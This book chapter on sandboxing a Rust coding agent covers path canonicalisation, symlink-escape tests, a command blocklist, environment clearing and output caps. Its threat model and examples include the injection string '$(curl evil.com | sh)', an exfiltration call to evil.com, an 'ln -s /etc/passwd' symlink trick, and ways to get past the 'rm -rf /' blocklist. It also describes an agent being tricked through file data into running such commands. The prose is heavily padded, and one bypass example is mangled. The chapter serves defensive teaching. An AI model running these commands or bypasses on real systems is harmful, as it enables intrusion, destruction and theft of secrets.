# Chapter 5: Sandboxing — The Agent's Safety Rails

> **"In theory there is no difference between theory and practice. In practice there is."** — *Yogi Berra*

---

## Introduction: The Gap Between Theory and Reality

A coding agent that canEdit files and execute shell commands is, from the operating system's point of view, simply a **very chatty user with an extraordinarily fast keyboard**. If the model decides — or **hallucinates** a decision, or is cleverly **tricked into deciding** — that it should execute `rm -rf ~/` or `rm -rf /`, absolutely nothing in the LLM API itself will stop it. **The only meaningful thing** standing between your agent and the complete destruction of your home directory is the **harness code that YOU deliberately wrote**.

This chapter is about THAT critical code. The central file is `src/tool_runners.rs` and the foundational ideas are **simple, ancient, and have been reinvented repeatedly by every single system permitting untrusted code to execute on trusted machines**. What is genuinely NEW here is the **application of these well-established techniques** to a component (the language model) that writes its own commands in English rather than in traditional assembly or bytecode.

---

## 5.1 The Comprehensive Threat Model

Before examining our defenses, we must understand the specific threats we worry about. In `rust_toy_agent`, we are concerned about precisely **three classes** of potential failure or attack:

### Class 1: Honest Mistakes (Most Common)
The model genuinely **intended** to edit `src/main.rs`, became genuinely confused about the current working directory, and wrote `../../main.rs` or `/etc/passwd`. This is by far **the single most common failure** and the **easiest to defend against** with proper path validation.

### Class 2: Path-Traversal Exploitation (Malicious Data)
A repository that the agent is actively reading contains a deliberately placed symlink called `README.md` that points directly at `/etc/shadow` (the critical password file on Unix systems). The model happily reads it and **pastes the contents** into the next tool call as if it were merely documentation. A human in the careful loop might ultimately notice this anomaly; the CI pipeline running automatically overnight absolutely will NOT.

### Class 3: Command-Injection Exploitation (The Nastiest)
A file that the model is actively processing contains a specially crafted string like `$(curl evil.com | sh)` or the backtick-variant `` `curl evil.com | sh` ``, the model embeds this into a `bash` command without proper quoting, and now a **remote attacker has fully arbitrary shell execution**. This is the **nastiest class** of attack because the **attack vector is DATA, not INSTRUCTIONS** — the model is not being malicious, it is being helpful by executing what it BELIEVES is legitimate data processing code.

### What We DO NOT Worry About
We deliberately do **NOT** worry about a model **deliberately attempting to escape** the sandbox. Large production deployments absolutely should, and specialized research labs have entire dedicated teams thinking about this extremely challenging problem. For our purposes in this book, we can **safely assume** the model is genuinely trying to help — and that any potentially hostile input is instead coming through **data channels** like file contents.

---

## 5.2 The Workdir Root: Foundation of All Safety

Every single tool runner in `rust_toy_agent` takes a `WorkdirRoot` parameter:

```rust
#[derive(Clone)]
pub struct WorkdirRoot {
    original: PathBuf,
    canonical: PathBuf,
}

impl WorkdirRoot {
    pub fn new(path: &Path) -> Result<Self, String> {
        let canonical = path.canonicalize()
            .map_err(|e| format!("canonicalize workdir: {e}"))?;
        Ok(Self { original: path.to_path_buf(), canonical })
    }
}
```

### Three Essential Observations

1. **The canonical path is computed ONCE, at construction time** (highlighted in **blue**). The `canonicalize()` function is an actual system call — it resolves symlinks automatically, converts relative paths to absolute, and returns an absolutely clean path with absolutely zero `.` or `..` path components remaining. Computing this **once** means absolutely every subsequent security check is a trivially fast **pure string comparison**.

2. **BOTH the original and canonical forms are stored** (highlighted in **green**). The `original` is what the human operator actually typed and what appears clearly in log messages and tool output. The `canonical` version is what the sandbox check uses. Do absolutely NOT confuse the two and do absolutely NOT collapse them into a single field — users absolutely DESPISE seeing their home directory like `~/project` expanded into the unreadable monstrosity `/Users/jane/Library/Application Support/Temporary/xyz`, AND sandbox checks on uncanonicalized paths are genuinely trivial to bypass.

3. **`new` returns `Result`, never `Option`** (highlighted in **purple**). If canonicalization **fails** — the path genuinely does not exist, permissions explicitly deny access, or the filesystem hiccups momentarily — the harness absolutely must know **EXACTLY WHY** so it can inform the user with a meaningful error. Never collapse a potentially recoverable error into `None`; **you lose the single most valuable piece of information** that would have enabled the user to fix the immediate problem.

### The Security Envelope
A `WorkdirRoot` is constructed absolutely **once** per agent session and threaded carefully through absolutely EVERY tool call. It is the **only mechanism** that grants access to the filesystem, and it grants access to **exactly one** isolated subtree — no more, no less.

---

## 5.3 The safe_path Function: The Workhorse of Sandbox Enforcement

**EVERY single file operation** begins with this absolutely critical function:

```rust
pub fn safe_path(p: &str, workdir_root: &WorkdirRoot)
    -> Result<PathBuf, String>
{
    let workdir_canon = workdir_root.as_canonical();
    let workdir = workdir_root.as_path();
    let joined = workdir.join(p);
    let resolved = canonicalize_partial(&joined)?;
    if !resolved.starts_with(workdir_canon) {
        return Err(format!("path escapes sandbox: {p}"));
    }
    Ok(resolved)
}
```

This function performs **exactly four sequential steps**:

### Step 1: Join the User Path (Highlighted in BLUE)
If the model passes the path `src/main.rs` and the workdir is genuinely `/home/jane/project`, the joined path becomes `/home/jane/project/src/main.rs`. This is precisely equivalent to `os.path.join` in Python. **Critically important note:** if the user passes an **ABSOLUTE path** like `/etc/passwd`, `join` in Rust (and identically in Python, and every other language) **completely throws away** the base directory — the joined path becomes just `/etc/passwd`. We handle this dangerous case specifically in Step 3.

### Step 2: Canonicalize (Highlighted in GREEN)
The `canonicalize_partial` function resolves all `.` and `..` path components, follows symlinks thoroughly, and returns an absolute path. The "partial" designation exists specifically because it handles paths to files that **do not yet exist** — this is absolutely necessary for the `write_file` tool to work — by canonicalizing the **deepest existing ancestor** and then appending the remaining path tail.

### Step 3: Check the Prefix (Highlighted in PURPLE)
`resolved.starts_with(workdir_canon)` is the **fundamental sandbox check**. If the canonical form of the completely resolved path does absolutely NOT begin with the canonical workdir, we absolutely **reject** with a clear error. This comprehensive check definitively handles:

- `../../etc/passwd` (resolves to absolutely outside the workdir)
- Absolute paths like `/etc/passwd` (immediately rejected as outside)
- **Symlink escapes** (the symlink target is fully resolved before any checking occurs)

### Step 4: Return the Resolved Path (Highlighted in ORANGE)
The function returns the **resolved path** for the caller to actually use. **Critically important:** the caller uses the **canonical path**, NOT the original user-supplied string. This absolutely prevents a dangerous **TOCTOU (Time-of-Check-Time-of-Use) race condition** where the path is valid during the security check but pointlessly redirects when the actual file operation runs. In Rust this race is dramatically narrower than in C because the filesystem API takes a `&Path` rather than a string — but absolutely the principle remains unchanged: always check and use the **same canonical object**.

### The Gold Line

**One single line** in `safe_path` is absolutely worth its weight in gold: `starts_with` on a `PathBuf` is **component-wise**, NOT byte-wise. That is absolutely essential because `/home/jane/project-evil` absolutely does NOT start with `/home/jane/project` as a path prefix, even though it absolutely DOES as a trivially naive string prefix. Getting this fundamental distinction **WRONG** is a classic, notorious sandbox-escape bug. **Rust's `Path::starts_with` handles this correctly; Python's `str.startswith` absolutely does NOT.** Know this critical difference intimately.

---

## 5.4 Symlink Traversal: The Genuinely Hard Case

The comprehensive test suite contains this critical test case:

```rust
#[test]
#[cfg(unix)]
fn symlink_outside_workdir_is_rejected() {
    let tmp = tempfile::TempDir::new().unwrap();
    let outside = tempfile::TempDir::new().unwrap();
    std::fs::write(outside.path().join("secret"), "x").unwrap();
    let link = tmp.path().join("escape");
    std::os::unix::fs::symlink(outside.path(), &link).unwrap();
    let wr = WorkdirRoot::new(tmp.path()).unwrap();
    let bad = safe_path("escape/secret", &wr);
    assert!(bad.is_err());
}
```

### The Test Constructs the Nasty Case
The test deliberately constructs exactly the nasty case we must defend against: a symlink **INSIDE** the workdir that points at a directory **completely OUTSIDE** the workdir. The naive security check — "does the string `escape/secret` contain ANY `..`?" — **correctly says NO**, and a naive sandbox would absolutely let this potentially catastrophic read through.

### How safe_path Actually Handles It
`safe_path` absolutely **REJECTS** this attack because `canonicalize_partial` automatically **follows the symlink BEFORE performing the essential prefix check**, and the completely resolved path `/tmp/other/secret` absolutely does NOT start with the workdir path prefix `/tmp/workdir`.

### Write This Test For Your Own Agent
**Write and maintain this specific test** for absolutely every agent you build. It is genuinely the **fastest way** to catch any sandbox regression — and sandbox regressions are frustratingly subtle because the happy path still works **perfectly fine** 99% of the time.

### The Mid-Session Symlink Attack
A related risk that most people completely forget about: **symlinks created DURING an active session**. The model executes the command `bash ln -s /etc/passwd foo` and then immediately calls `read_file foo`. In `rust_toy_agent`, this attack also gets caught completely, because `read_file` absolutely **goes through `safe_path` on EVERY single invocation** and re-canonicalizes the path fresh every time. A weaker security design would **cache** the canonical form of each path encountered and would absolutely **MISS** the dangerous new symlink. **Absolutely never cache sandbox checks.**

---

## 5.5 The Bash Allowlist: Defense in Depth

Shell commands absolutely CANNOT be sandboxed through path-checking alone — the entire fundamental point of a shell is to invoke **arbitrary programs** as determined by the user. Therefore, `run_bash` takes a fundamentally **different, cruder approach:**

```rust
pub fn run_bash(command: &str, workdir: &Path) -> String {
    let blocked = ["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"];
    if blocked.iter().any(|b| command.contains(b)) {
        return "Error: Dangerous command blocked".to_string();
    }
    let mut cmd = Proc::new("sh");
    cmd.arg("-c").arg(command);
    cmd.current_dir(workdir);
    cmd.env_clear();
    for key in BASH_ENV_ALLOWLIST {
        if let Ok(val) = std::env::var(key) {
            cmd.env(key, val);
        }
    }
    // ... (actual command execution continues)
}
```

We will examine these **two distinct defense mechanisms** separately:

### Defense 1: The Substring Blocklist (Limited Effectiveness)
The blocklist is explicitly **best-effort only**. The original source code comment spells this out plainly: "a best-effort guard against obvious footguns, NOT a genuine security boundary." A **determined attacker** bypasses `"rm -rf /"` trivially using any of these techniques:

- `rm -rf`t/` (tab character separates arguments)
- `/bin/rm -rf /` (absolute path to binary)
- `bash -c "r""m -rf /"` (clever quoting)
- And literally **a hundred other clevernesses**

The blocklist is genuinely there to catch the model doing something **honestly stupid**, NOT to stop a genuinely hostile model. **Absolute Rule: Never rely on a blocklist for security.** True security isolation must come from **running the agent in a full VM, a container, or (at absolute minimum) as a dedicated user** with no access to anything genuinely valuable.

### Defense 2: The Environment Allowlist (Real Security Value)
This is the **genuinely valuable defense**: `cmd.env_clear()` absolutely wipes **every single environment variable**, and then the subsequent loop carefully adds back ONLY the ones defined in `BASH_ENV_ALLOWLIST`. This matters for **three distinct, critically important reasons**:

| Reason | How It Protects |
|--------|----------------|
| **Secrets in the parent environment stay isolated** | If the human ran the agent with `ANTHROPIC_API_KEY` set, that variable exists in the parent process's environment. Without `env_clear`, the model's `bash` calls absolutely inherit it — and a `bash printenv` absolutely reveals the key, which ends up in the conversation history, which ends up in stored logs — a **severe information leak**. |
| **`PATH` is carefully controlled** | If the agent runs with a carefully constructed `PATH` pointing only at absolutely trusted directories, wiping and replacing it definitively means the model absolutely CANNOT override it by prepending `/tmp/evil` to the path. |
| **Tool behavior becomes deterministic** | Variables like `LANG`, `TZ`, and `LC_ALL` change how shell commands format their output. A deterministic environment ensures absolutely deterministic tool results, which in turn enables genuinely reproducible agent behavior. |

### The Actual Allowlist in Practice
The environment allowlist in `rust_toy_agent` is deliberately **small** — containing just the few variables that the model actually needs to see (`PATH`, `HOME`, `USER`, `TERM`, etc.). Look up the precise allowlist in `config.rs`. When **you** write your own agent, genuinely **start with an empty allowlist** and conservatively add only the variables whose absence absolutely **breaks** something you actually need.

---

## 5.6 Output Caps as Essential Sandboxing

**One absolutely critical piece** that is frequently overlooked is often dismissed as mere optimization when it is absolutely **vital security:

```rust
if text.len() > MAX_TOOL_OUTPUT_BYTES {
    text[..MAX_TOOL_OUTPUT_BYTES].to_string()
}
```

`MAX_TOOL_OUTPUT_BYTES` is defined as precisely **50 KB**. Absolutely every tool output is hard-capped at this size. This is absolutely NOT a size optimization — this is a **genuine defense** mechanism against a very specific attack.

### The Attack It Prevents
The attack this prevents: the model executes `cat /dev/urandom` or `dmesg` or `find / -type f 2>/dev/null` and genuinely attempts to read **megabytes of raw output** into the context window. Without a sensible cap:

| Consequence | Impact |
|------------|--------|
| **The context window blows up catastrophically** | A single tool call can eat your **entire token budget**, and the agent dies immediately on the following round |
| **The API bill explodes** | You pay for absolutely every token, **twice** — once on input, once on output |
| **Log files bloat uncontrollably** | Observability becomes genuinely expensive at scale |
| **Downstream parsers hang** | A 100-MB string embedded in a JSON blob absolutely represents a **denial-of-service attack** on every piece of code that touches the conversation |

### Why 50 KB Is The Correct Number
A 50 KB cap is genuinely NOT a clever magic number — it represents "approximately ten full screens of text" — which is genuinely sufficient for absolutely ANY single useful observation and absolutely small enough that the model absolutely **must be strategic** about its reads. When the model hits this cap, it genuinely sees `(output truncated, 1,234,567 bytes total)` and absolutely **adjusts intelligently** — almost always by adding `| head`, `| grep`, or `| wc -l` on the **very next turn**. **The cap actively teaches the model to be economical with its reads.** A bigger cap is genuinely a WORSE cap.

---

## 5.7 What This Comprehensive System Absolutely Does NOT Protect Against

It is worth being absolutely honest about what sandboxing at the **harness layer** fundamentally CANNOT do. `rust_toy_agent`'s multi-layered defenses do absolutely NOTHING to stop:

| Attack Vector | Why The Harness Can't Help |
|-------------|------------------------|
| **Network access** | `bash curl evil.com` works absolutely fine. If your comprehensive threat model genuinely includes exfiltration, you absolutely require explicit network isolation at the OS layer (firewall rules specifically, the `unshare --net` command, or container networking disabled entirely). |
| **Forkbombs, memory bombs, CPU hogging** | Absolutely nothing caps the total resource usage of a single `bash` call. A genuinely rogue tool can absolutely consume the entire host. Production deployments absolutely require `ulimit`, explicit cgroups, or a dedicated full VM for each session. |
| **Persistent changes inside the workdir** | The sandbox absolutely deliberately keeps absolutely ALL writes inside the workdir, which is exactly what we want for safety — but that absolutely means the agent can happily corrupt the workdir itself. Use git aggressively. Commit frequently. Create a fresh branch per agent session. Chapter 10 extensively covers git worktree isolation for this exact reason. |
| **Sensitive data exfiltration through outputs** | A model that reads `~/.ssh/id_rsa` (assuming the sandbox allows it through at all, which it absolutely does NOT here in this implementation) can absolutely write those secret contents into a `tool_result`, and from there directly into the logs. This is exactly why Chapter 4 absolutely warns about secrets in the environment: **the absolute weakest link is whatever is already inside the sandbox**. |

### The Layered Philosophy
**Sandboxing is genuinely layered**, and absolutely the harness layer handles ONLY the layers it absolutely can: **path traversal** defense, **environment leakage** prevention, and absolutely **output bloat** management. The other absolutely critical layers (Operating System-level isolation, explicit network filtering, git-based recovery) are absolutely outside the scope of a single source file — but absolutely NOT outside the scope of a genuinely responsible agent deployment.

---

## Chapter 5 Summary and Transition

In this chapter, we thoroughly mastered:

1. **The comprehensive threat model** — understanding the three classes of attack and why data channels are often more dangerous than direct instructions.

2. **The WorkdirRoot structure** — appreciating why canonical vs. original paths must be maintained separately and why returning `Result` over `Option` is non-negotiable.

3. **The safe_path mechanism** — the complete foundation of sandbox enforcement, and why `starts_with` on PathBuf is semantically different from string operations.

4. **Symlink traversal protection** — understanding why we canonicalize BEFORE checking, and why caching is a fundamental security bug.

5. **The bash allowlist** — appreciating why a blocklist is best-effort entertainment while an allowlist is genuinely valuable security architecture.

6. **Output caps as existential defense** — understanding that 50 KB teaches the model to be economical rather than merely saving bandwidth.

7. **Honest limitations** — acknowledging what absolutely must be handled by other system layers.

In the **next chapter**, we step significantly back up to the conversation layer and comprehensively examine how the harness manages context over potentially **hundreds** of interaction turns: sophisticated truncation strategies, context compaction, message pairing invariants, and the precise token budget mathematics that prevents a genuinely long-running agent from drowning in its own ever-growing history.

---

**Next:** Chapter 6 — Context Management and Token Budgets